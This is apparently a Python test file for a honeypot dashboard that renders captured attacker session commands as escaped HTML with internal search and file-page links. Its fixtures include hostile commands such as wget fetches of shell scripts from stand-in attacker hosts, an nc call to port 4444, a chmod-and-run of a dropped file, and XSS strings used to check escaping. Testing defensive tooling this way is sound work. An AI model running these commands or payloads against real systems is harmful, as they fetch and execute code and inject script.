# Session log lines: what is marked, where links go, and that log text stays harmless.
import re, time, unittest

from tests.helpers import app

NOW = time.time()
SHA = "ef" * 32
IP = "198.51.100.70"


class Lines(unittest.TestCase):
    def test_download_word_is_marked(self):
        self.assertIn('<span class="c-k">wget</span>', app.cmd_html("wget -q x"))

    def test_upper_case_is_marked(self):
        self.assertIn('<span class="c-k">CURL</span>', app.cmd_html("CURL x"))

    def test_url_searches_for_its_host_and_never_links_out(self):
        html = app.cmd_html("wget http://evil.example.net:8080/a.sh -O x")
        self.assertIn('href="/search?q=evil.example.net"', html)
        self.assertNotRegex(html, r'href="(?!/)')

    def test_address_searches_without_port(self):
        self.assertIn('href="/search?q=203.0.113.9"', app.cmd_html("nc 203.0.113.9:4444"))

    def test_broken_url_does_not_crash(self):
        html = app.cmd_html("curl http://[x")
        self.assertIn("http://[x", html)
        self.assertNotIn('href="/search', html)

    def test_captured_file_links_to_its_page(self):
        html = app.cmd_html("chmod +x /tmp/.x; /tmp/.x", {"/tmp/.x": SHA})
        self.assertEqual(html.count('href="/campaign/file/%s"' % SHA), 2)

    def test_captured_url_prefers_the_file_page(self):
        url = "http://203.0.113.9/bin.sh"
        html = app.cmd_html("wget " + url, {url: SHA})
        self.assertIn('href="/campaign/file/%s"' % SHA, html)
        self.assertNotIn("/search?q=203", html)

    def test_file_name_inside_a_longer_word_is_not_a_match(self):
        self.assertNotIn("/campaign/file", app.cmd_html("cat /tmp/.xyz", {"/tmp/.x": SHA}))

    def test_start_of_a_longer_path_is_not_the_file(self):
        self.assertNotIn("/campaign/file", app.cmd_html("cat /tmp/payload/config", {"/tmp/payload": SHA}))
        self.assertNotIn("/campaign/file", app.cmd_html("wget http://evil.example/x.sh/other", {"http://evil.example/x.sh": SHA}))

    def test_file_followed_by_shell_punctuation(self):
        self.assertIn("/campaign/file", app.cmd_html("sh /tmp/a.sh; id", {"/tmp/a.sh": SHA}))
        self.assertIn("/campaign/file", app.cmd_html("cat '/tmp/a.sh'", {"/tmp/a.sh": SHA}))

    def test_ipv6_alone_searches(self):
        self.assertIn('href="/search?q=2001%3Adb8%3A%3A1"', app.cmd_html("nc 2001:db8::1 4444"))

    def test_clock_time_is_plain_text(self):
        self.assertEqual(app.cmd_html("date 12:30:45"), "date 12:30:45")

    def test_name_with_two_contents_gets_no_link(self):
        ev = [{"kind": "file", "a": "/tmp/p", "b": SHA}, {"kind": "file", "a": "/tmp/p", "b": "ab" * 32}, {"kind": "file", "a": "/tmp/q", "b": SHA}]
        self.assertEqual(app.session_files(ev), {"/tmp/q": SHA})

    def test_name_with_regex_characters(self):
        self.assertIn("/campaign/file", app.cmd_html("sh a(1)+b.sh", {"a(1)+b.sh": SHA}))

    def test_short_names_and_bad_hashes_are_left_out(self):
        ev = [{"kind": "file", "a": ".d", "b": SHA}, {"kind": "file", "a": "/tmp/ok", "b": "nothex"}, {"kind": "cmd", "a": "/tmp/x", "b": SHA},
              {"kind": "file", "a": "/tmp/good", "b": SHA}]
        self.assertEqual(app.session_files(ev), {"/tmp/good": SHA})

    def test_everything_is_escaped(self):
        for text in ("<img src=x onerror=alert(1)>", 'wget http://a.example/"><script>x</script>', "<b>wget</b> 203.0.113.9<i>", "curl http://<img>.example/"):
            html = app.cmd_html(text, {"<x>": SHA})
            self.assertNotRegex(re.sub(r'<(/?)(a|span)\b[^>]*>', "", html), r"<[a-z/]", text)

    def test_plain_text_is_unchanged_apart_from_escaping(self):
        self.assertEqual(app.cmd_html("uname -a && id"), "uname -a &amp;&amp; id")


class Page(unittest.TestCase):
    def test_attacker_page_uses_it(self):
        app._local.h12 = False
        con = app.connect()
        with con:
            for t in ("events", "sessions", "ips", "seen"):
                con.execute("DELETE FROM %s" % t)
        ts = NOW - 50
        rows = [("l|%d" % i, ts + i, IP, "cowrie", k, "ls1", a, b) for i, (k, a, b) in enumerate((
            ("connect", "ssh", "2225"), ("login_ok", "root", "pw"), ("cmd", "wget http://evil.example.net/x", None),
            ("file", "http://evil.example.net/x", SHA), ("file_fail", "http://bad.example.net/y", None), ("closed", "4.0", None)))]
        app.store(con, rows)
        html = app.v_ip(IP)
        self.assertIn('<span class="c-k">wget</span>', html)
        self.assertIn('href="/campaign/file/%s"' % SHA, html)
        self.assertIn('href="/search?q=bad.example.net"', html)
        self.assertNotRegex(html, r'<a [^>]*href="https?://(evil|bad)')
        self.assertNotRegex(html, r"\sstyle=")
